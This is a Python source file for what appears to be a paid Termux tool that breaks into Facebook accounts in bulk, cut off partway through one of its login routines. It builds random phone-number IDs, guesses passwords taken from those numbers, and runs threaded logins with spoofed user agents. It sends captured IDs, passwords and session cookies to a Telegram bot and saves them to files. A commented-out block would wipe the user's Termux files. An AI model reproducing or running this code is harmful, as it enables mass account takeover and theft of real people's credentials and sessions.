"[FBAN/FB4A;FBAV/351.0.0.38.117;FBBV/347007244;FBDM/{density=2.75,width=1080,height=2150};FBLC/ru_RU;FBRV/348099364;FBCR/Ucell;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 6 Pro;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/352.0.0.21.117;FBBV/348184931;FBDM/{density=2.0,width=720,height=1280};FBLC/ru_RU;FBRV/0;FBCR/activ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J330F;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/351.0.0.38.117;FBBV/347007278;FBDM/{density=2.75,width=1080,height=2132};FBLC/uk_UA;FBRV/348304748;FBCR/UA-KYIVSTAR;FBMF/Xiaomi;FBBD/POCO;FBPN/com.facebook.katana;FBDV/M2010J19CG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/351.0.0.38.117;FBBV/347007278;FBDM/{density=2.75,width=1080,height=2029};FBLC/uk_UA;FBRV/348304748;FBCR/KYIVSTAR;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/MI 8;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/352.0.0.21.117;FBBV/348184945;FBDM/{density=2.0,width=720,height=1384};FBLC/ru_RU;FBRV/0;FBCR/UCell;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J600F;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/351.0.0.38.117;FBBV/347007278;FBDM/{density=2.75,width=1080,height=2110};FBLC/ru_RU;FBRV/348304748;FBCR/;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/351.0.0.38.117;FBBV/347007278;FBDM/{density=2.75,width=1080,height=2134};FBLC/ru_RU;FBRV/348250972;FBCR/UA-KYIVSTAR;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2004J19C;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/351.0.0.38.117;FBBV/347007278;FBDM/{density=3.0,width=1080,height=2076};FBLC/ru_RU;FBRV/348304748;FBCR/Vodafone UA | MTS UKR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/352.0.0.21.117;FBBV/348184779;FBDM/{density=2.75,width=1080,height=2134};FBLC/uk_UA;FBRV/348512045;FBCR/UA-KYIVSTAR;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/352.0.0.21.117;FBBV/348184967;FBDM/{density=2.75,width=1080,height=2167};FBLC/ru_RU;FBRV/348549991;FBCR/UA-KYIVSTAR;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2103K19G;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",]



usragent=[]
for xd in range(10000):
        aa='Mozilla/5.0 (X11; Linux x86_64'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f' TL-tl; {str(samsung1)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(100,114)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Safari/537.36'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        usragent.append(uaku2)

def clear():
  os.system('clear')
import requests,os
import os
os.system("pkg install espeak")
os.system("git pull")
os.system("clear")
jalan('\033[38;5;196m                 INSTALLING TOOLS           ')
jalan('\033[38;5;34m                       WAIT               ')
os.system('espeak -b 30 "WAIT"')
time.sleep(0.03)
os.system("xdg-open https://chat.whatsapp.com/ImgbbAV3zyu5LK4aIX4EnO");
os.system('clear')
def ____banner____():
    if "win" in sys.platform:os.system("cls")
    else:os.system("clear")
    print(f"""\033[38;5;33m
    █████╗ ████████╗ ██████╗ ███╗   ███╗
   ██╔══██╗╚══██╔══╝██╔═══██╗████╗ ████║
   ███████║   ██║   ██║   ██║██╔████╔██║
   ██╔══██║   ██║   ██║   ██║██║╚██╔╝██║
   ██║  ██║   ██║   ╚██████╔╝██║ ╚═╝ ██║
   ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝ \x1b[38;1;97m ᴾᴿᴼ
\033[38;5;196m────────────────────────────────────────────
\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m CEO & OWNER \033[38;5;196m : \x1b[38;5;196m SUMON ROY
\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m ABOUTS \033[38;5;196m      :\x1b[38;5;196m DESTROYED
\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m VERSION \033[38;5;196m     :\x1b[38;1;97m 109.0.5.0.3
\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m STATUS \033[38;5;196m      :\x1b[38;5;196m PREMIUM 
\033[38;5;196m────────────────────────────────────────────""")

def fuckxd():
    os.system('clear')
    ____banner____()
#━━━━[ LINE ]━━━━#
def linex():
        print(f"\033[38;5;196m-----------------------------------------")
	             
#-------------------[LOCATION CHECK]-------------------#
"""uxernamx = sys.argv[0]
if uxernamx=='GREEN.py':
    try:
        readhead = open('.git/config','r').read()
    except:
        print('   Somting Wrong Bro')
        idx()
    if 'BITHIKA-XD' in readhead:
        pass
    else:
        idx()
        os.system('rm -rf /data/data/com.termux/files');exit()
else:
    idx()
    os.system('rm -rf /data/data/com.termux/files');exit()"""
class Process:
    def __init__(self):
        self.cc=[]
        self.key="ATOM-"+base64.b16encode(str(os.getuid()).encode()).decode()+hashlib.md5((platform.version() + str(os.getuid()) + platform.platform() + os.getlogin() + platform.release()).replace(' ', '').encode()).hexdigest()
        #self.key=""
        self.clear()
        r = self.Gex('https://github.com/DESTROYED-ATOM/ATOM/blob/main/Approve.txt')
        if self.key in r:
            self.enroll()
        else:
            self.clear()
            print("\x1b[38;1;97m               NOTES   ")
            print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m HELLO.... DEAR USER THIS IS PREMIUM TOOLS ")
            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m AFTER PAYMENT ACCESS TOOLS ")
            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m PRICE LIST ADMIN INBOX ")
            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key:\033[0;93m " +self.key)
            input("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Press Enter To Send Key")
            time.sleep(3.5)
            tks = 'TOKEN KEY =%20%20:%20'+self.key
            os.system('am start https://wa.me/+918389066877?text=' + tks)
            exit()
    def clear(self):os.system('clear');____banner____()
    def Gex(self,x):
        buffer = BytesIO()
        c = pycurl.Curl()
        c.setopt(c.URL, x)
        c.setopt(c.WRITEDATA, buffer)
        try:c.perform()
        except:exit(' Network Issue')
        c.close()
        return buffer.getvalue().decode('utf-8')
    def enroll(self):
        BITHIKA()

#━━━━[ MAIN ]━━━━#
def BITHIKA():
    ____banner____()
    print(f'{rad}[{white}A{rad}]{rad}[{white}1{rad}]\033[1;37mTURN ON FILE CLONE')
    print(f'{rad}[{white}B{rad}]{rad}[{white}2{rad}]\033[1;37mTURN ON MAIL CLONE')
    print(f'{rad}[{white}C{rad}]{rad}[{white}3{rad}]\033[1;37mTURN ON RANDOM CLONE')
    print(f'{rad}[{white}D{rad}]{rad}[{white}4{rad}]\033[1;37mJOIN COMMUNITY GROUP')
    print(f'{rad}[{white}E{rad}]{rad}[{white}5{rad}]\033[1;37mREPORT BUGS');linex()
    __BITHIKA__ = input(f'{rad}[{white}🔖{rad}] {green}Selection  {white}▶︎ {yelloww}')
    if __BITHIKA__ in ['A','a','01','1']:__FILEX__()
    elif __BITHIKA__ in ['B','b','02','2']:print(f'\n[×]{rad}coming soon... ');BITHIKA()
    elif __BITHIKA__ in ['C','c','03','3']:SETINGX()
    elif __BITHIKA__ in ['D','d','04','4']:os.system("xdg-open https://chat.whatsapp.com/ImgbbAV3zyu5LK4aIX4EnO")
    elif __BITHIKA__ in ['E','e','05','5']:os.system("xdg-open https://wa.me/+918389066877")
    else:print(f'\n[×]{rad} Choose Value Option... ');BITHIKA()

#━━━━[ SELECT MENU ]━━━━#
def SETINGX():
    ____banner____()
    print(f"{K} [{H}1{K}] {WHITE}RANDOM WITH STR RANGE 6")
    print(f"{K} [{H}2{K}] {WHITE}RANDOM WITH STR RANGE 7")
    print(f"{K} [{H}3{K}] {WHITE}RANDOM WITH STR RANGE 5");linex()
    __BITHIKAi__ = input(f'{rad}[{white}🔖{rad}]{green} SELECTION  {white}▶︎ {yelloww}')
    if __BITHIKAi__ in ['A','a','01','1']:RANDOM()
    elif __BITHIKAi__ in ['B','b','02','2']:INDIA()
    elif __BITHIKAi__ in ['C','c','03','3']:PAKISTAN()
    else:print(f'\n[×]{rad} Choose Value Option... ');SETINGX()

#━━━━[ BANGLADESH RANDOM ]━━━━#
def RANDOM():
  user=[]
  os.system('clear');____banner____();print(c7);print(led)
  kode = input(f'{dot}SELECT CODE {M}: {H}');print(led);print(limitt);print(led)
  limit = int(input(f'{dot}ENTER LIMIT {M}: {H}'));print(led)
  xd_cp=input(f'{wt}SHOW CP ACCOUNT  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
  if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
  else:cp_xdx.append('n')
 # print(led)
  #cokixx=input(f'{wt}SHOW COOKIES  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
 #if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
  #else:cokix.append('n')
  clear();____banner____();print(f"{dot}{P}SIM CODE  {RED}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}M5{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}M6{P}]');print(f' {K}[{H}7{K}] {P}Method [{H}M7{P}]');print(f' {K}[{H}8{K}] {P}Method [{H}M8{P}]');print(led)
  hc = input(f'{wt}Select Method {M}:{H} ')
  if hc in ['1','01']:mtd.append('m1')
  elif hc in ['2','02']:mtd.append('m2')
  elif hc in ['3','03']:mtd.append('m3')
  elif hc in ['4','04']:mtd.append('m4')
  elif hc in ['5','05']:mtd.append('m5')
  elif hc in ['6','06']:mtd.append('m6')
  elif hc in ['7','07']:mtd.append('m7')
  elif hc in ['8','08']:mtd.append('m8')
  else:
      mtd.append('m1')
  for nmbr in range(limit):
    nmp = ''.join(random.choice(string.digits) for _ in range(5))
    user.append(nmp)
  with tred(max_workers=30) as king_xd:
    os.system('clear')
    tl = str(len(user))
    ____banner____();print(f'{dot}YOUR CITY{RED}   : {YELLOW}'+current_city);print(f'{dot}METHOD{RED}      : {faltu}{black}RANDOM{pvt}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
    for guru in user:
      ids = kode+guru
      pwv = [ids[:6],ids[:8],ids,]
      if 'm1' in mtd:king_xd.submit(m1,ids,pwv)
      elif 'm2' in mtd:king_xd.submit(m2,ids,pwv)
      elif 'm3' in mtd:king_xd.submit(m3,ids,pwv)
      elif 'm4' in mtd:king_xd.submit(m4,ids,pwv)
      elif 'm5' in mtd:king_xd.submit(m5,ids,pwv)
      elif 'm6' in mtd:king_xd.submit(m6,ids,pwv)
      elif 'm7' in mtd:king_xd.submit(m7,ids,pwv)
      elif 'm8' in mtd:king_xd.submit(m8,ids,pwv)
      else:
       king_xd.submit(m5,ids,pwv)
  print('');print(f'{N} Hi Dear User Crack process has been completed')
  input(f'{dot}Press Enter To Go Menu');os.system('python BITHIKA.py')
#━━━━[ INDIAN RANDOM ]━━━━#
def INDIA():
  user=[]
  os.system('clear');____banner____();print(c7);print(led)
  kode = input(f'{dot}SELECT CODE {M}: {H}');print(led);print(limitt);print(led)
  limit = int(input(f'{dot}ENTER LIMIT {M}: {H}'));print(led)
  xd_cp=input(f'{wt}SHOW CP ACCOUNT  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
  if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
  else:cp_xdx.append('n')
 # print(led)
  #cokixx=input(f'{wt}SHOW COOKIES  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
 #if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
  #else:cokix.append('n')
  clear();____banner____();print(f"{dot}{P}SIM CODE  {RED}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}M5{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}M6{P}]');print(f' {K}[{H}7{K}] {P}Method [{H}M7{P}]');print(f' {K}[{H}8{K}] {P}Method [{H}M8{P}]');print(led)
  hc = input(f'{wt}Select Method {M}:{H} ')
  if hc in ['1','01']:mtd.append('m1')
  elif hc in ['2','02']:mtd.append('m2')
  elif hc in ['3','03']:mtd.append('m3')
  elif hc in ['4','04']:mtd.append('m4')
  elif hc in ['5','05']:mtd.append('m5')
  elif hc in ['6','06']:mtd.append('m6')
  elif hc in ['7','07']:mtd.append('m7')
  elif hc in ['8','08']:mtd.append('m8')
  else:
      mtd.append('m1')
  for nmbr in range(limit):
    nmp = ''.join(random.choice(string.digits) for _ in range(6))
    user.append(nmp)
  with tred(max_workers=30) as king_xd:
    os.system('clear')
    tl = str(len(user))
    ____banner____();print(f'{dot}YOUR CITY{RED}   : {YELLOW}'+current_city);print(f'{dot}METHOD{RED}      : {faltu}{black}RANDOM{pvt}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
    for guru in user:
      ids = kode+guru
      pwv = [ids[:6],ids[:8],ids,]
      if 'm1' in mtd:king_xd.submit(m1,ids,pwv)
      elif 'm2' in mtd:king_xd.submit(m2,ids,pwv)
      elif 'm3' in mtd:king_xd.submit(m3,ids,pwv)
      elif 'm4' in mtd:king_xd.submit(m4,ids,pwv)
      elif 'm5' in mtd:king_xd.submit(m5,ids,pwv)
      elif 'm6' in mtd:king_xd.submit(m6,ids,pwv)
      elif 'm7' in mtd:king_xd.submit(m7,ids,pwv)
      elif 'm8' in mtd:king_xd.submit(m8,ids,pwv)
      else:
       king_xd.submit(m5,ids,pwv)
  print('');print(f'{N} Hi Dear User Crack process has been completed')
  input(f'{dot}Press Enter To Go Menu');os.system('python BITHIKA.py')
#━━━━[ PAKISTAN RANDOM ]━━━━#
def PAKISTAN():
  user=[]
  os.system('clear');____banner____();print(c7);print(led)
  kode = input(f'{dot}SELECT CODE {M}: {H}');print(led);print(limitt);print(led)
  limit = int(input(f'{dot}ENTER LIMIT {M}: {H}'));print(led)
  xd_cp=input(f'{wt}SHOW CP ACCOUNT  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
  if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
  else:cp_xdx.append('n')
 # print(led)
  #cokixx=input(f'{wt}SHOW COOKIES  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
 #if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
  #else:cokix.append('n')
  clear();____banner____();print(f"{dot}{P}SIM CODE  {RED}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}M5{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}M6{P}]');print(f' {K}[{H}7{K}] {P}Method [{H}M7{P}]');print(f' {K}[{H}8{K}] {P}Method [{H}M8{P}]');print(led)
  hc = input(f'{wt}Select Method {M}:{H} ')
  if hc in ['1','01']:mtd.append('m1')
  elif hc in ['2','02']:mtd.append('m2')
  elif hc in ['3','03']:mtd.append('m3')
  elif hc in ['4','04']:mtd.append('m4')
  elif hc in ['5','05']:mtd.append('m5')
  elif hc in ['6','06']:mtd.append('m6')
  elif hc in ['7','07']:mtd.append('m7')
  elif hc in ['8','08']:mtd.append('m8')
  else:
      mtd.append('m1')
  for nmbr in range(limit):
    nmp = ''.join(random.choice(string.digits) for _ in range(7))
    user.append(nmp)
  with tred(max_workers=30) as king_xd:
    os.system('clear')
    tl = str(len(user))
    ____banner____();print(f'{dot}YOUR CITY{RED}   : {YELLOW}'+current_city);print(f'{dot}METHOD{RED}      : {faltu}{black}RANDOM{pvt}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
    for guru in user:
      ids = kode+guru
      pwv = [ids[:6],ids[:8],ids,]
      if 'm1' in mtd:king_xd.submit(m1,ids,pwv)
      elif 'm2' in mtd:king_xd.submit(m2,ids,pwv)
      elif 'm3' in mtd:king_xd.submit(m3,ids,pwv)
      elif 'm4' in mtd:king_xd.submit(m4,ids,pwv)
      elif 'm5' in mtd:king_xd.submit(m5,ids,pwv)
      elif 'm6' in mtd:king_xd.submit(m6,ids,pwv)
      elif 'm7' in mtd:king_xd.submit(m7,ids,pwv)
      elif 'm8' in mtd:king_xd.submit(m8,ids,pwv)
      else:
       king_xd.submit(m5,ids,pwv)
  print('');print(f'{N} Hi Dear User Crack process has been completed')
  input(f'{dot}Press Enter To Go Menu');os.system('python BITHIKA.py')
#━━━━[ METHOD RANDOM ]━━━━#
def m1(ids,pwv):
    global loop,oks,cps
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M1{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
    ua =usragnt
    pro = random.choice(usragent)
    warna = random.choice(my_color)
    try:
        for pas in pwv:
            session = requests.Session()
            free_fb = session.get(f"https://mbasic.facebook.com").text
            info={
    "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
    "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
    "try_number": 0,
    "unrecognized_tries": 0,
    "email": ids,
    "prefill_contact_point": ids,
    "prefill_source": "browser_dropdown",
    "prefill_type": "contact_point",
    "first_prefill_source": "browser_dropdown",
    "first_prefill_type": "contact_point",
    "had_cp_prefilled": True,
    "had_password_prefilled": False,
    "is_smart_lock": False,
    "bi_xrwh": 0,
    "encpass": "#PWD_BROWSER:0:{}:{}".format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pas),
    "bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
    "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
    "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),}
            update= {'Host': 'mbasic.facebook.com',
    'Content-Length': '1730',
    'Sec-CH-UA': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
    'Sec-CH-UA-Mobile': '?1',
    'User-Agent': "Mozilla/5.0 (Linux; Android 14; 23076PC4BI Build/UKQ1.230917.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/126.0.6478.134 Mobile Safari/537.36",
    'X-Response-Format': 'JSONStream',
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-FB-LSD': 'AVo_Z7twFKE',
    'Viewport-Width': '360',
    'Sec-CH-UA-Platform-Version': '""',
    'X-Requested-With': 'XMLHttpRequest',
    'X-ASBD-ID': '129477',
    'DPR': '2',
    'Sec-CH-UA-Full-Version-List': '',
    'Sec-CH-UA-Model': '""',
    'Sec-CH-Prefers-Color-Scheme': 'light',
    'Sec-CH-UA-Platform': '"Android"',
    'Accept': '*/*',
    'Origin': 'https://mbasic.facebook.com',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://mbasic.facebook.com/',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-IE,en-US;q=0.9,en;q=0.8'}
            response=session.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data = info,headers = update,allow_redirects = False)
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
                cid = re.findall('c_user=(.*);xs',kuki)[0]
                check =f"http://www.hearhour.shop/ajaxs/client/check-live-fb.php?uid={cid}"
                bithi = requests.get(check).text
                if 'LIVE' in bithi:
                     print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                     print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
                     statusok = (f" {cid} | {pas} | {kuki} ")
                     cek_apk(kuki)
                     requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                     open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                     oks.append(cid)
                     break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                if 'y' in cp_xdx:
                         print(f'\r{P} [\033[1;30mATOM-CP{P}] \033[1;30m{uid}|{pas}')
                         open(' /sdcard/ATOM-CP.txt','a').write(uid+'|'+pas+'|'+'\n')
                         cps.append(uid)
            else:
                continue
            time.sleep(0.01)
        loop+=1
 
    except:
        pass

def m2(ids,pwv):
    global loop,oks,cps
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M2{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
    ua =usragnt
    pro = random.choice(usragent)
    warna = random.choice(my_color)
    try:
        for pas in pwv:
            session = requests.Session()
            free_fb = session.get(f"https://mbasic.facebook.com").text
            info={
    "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
    "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
    "try_number": 0,
    "unrecognized_tries": 0,
    "email": ids,
    "prefill_contact_point": ids,
    "prefill_source": "browser_dropdown",
    "prefill_type": "contact_point",
    "first_prefill_source": "browser_dropdown",
    "first_prefill_type": "contact_point",
    "had_cp_prefilled": True,
    "had_password_prefilled": False,
    "is_smart_lock": False,
    "bi_xrwh": 0,
    "encpass": "#PWD_BROWSER:0:{}:{}".format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pas),
    "bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
    "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
    "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),}
            update={
            'User-Agent': "Mozilla/5.0 (Linux; Android 14; 23076PC4BI Build/UKQ1.230917.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/126.0.6478.134 Mobile Safari/537.36",
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Cache-Control': 'max-age=0',
            'Referer': 'https://lm.facebook.com/',
            'DNT': '1',
            'Pragma': 'no-cache',
            'TE': 'Trailers', }
            response=session.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data = info,headers = update,allow_redirects = False)
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
                cid = re.findall('c_user=(.*);xs',kuki)[0]
                check =f"http://www.hearhour.shop/ajaxs/client/check-live-fb.php?uid={cid}"
                bithi = requests.get(check).text
                if 'LIVE' in bithi:
                     print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                     print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
                     cek_apk(kuki)
                     statusok = (f" {cid} | {pas} | {kuki} ")
                     requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                     open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                     oks.append(cid)
                     break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                if 'y' in cp_xdx:
                         print(f'\r{P} [\033[1;30mATOM-CP{P}] \033[1;30m{uid}|{pas}')
                         open(' /sdcard/ATOM-CP.txt','a').write(uid+'|'+pas+'|'+'\n')
                         cps.append(uid)
            else:
                continue
            time.sleep(0.01)
        loop+=1
 
    except:
        pass

def m3(ids,pwv):
    global loop,oks,cps
